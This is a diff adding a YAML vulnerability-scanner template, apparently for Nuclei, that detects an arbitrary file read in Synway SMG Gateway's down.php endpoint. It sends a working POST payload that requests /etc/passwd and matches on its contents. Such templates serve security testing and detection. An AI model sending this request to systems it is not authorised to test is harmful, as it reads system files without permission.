@@ -1,0 +1,30 @@
+id: synway-smg-downphp-anyfile-read
+info:
+  name: Synway SMG Gateway Management Software Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Synway SMG Gateway Management Software is vulnerable to an arbitrary file read through the down.php endpoint.
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/down.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "downfile=/etc/passwd&down=x&runinfoupdate=1"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin/sh"
+      - type: word
+        part: header
+        words:
+          - "application/octet-stream"
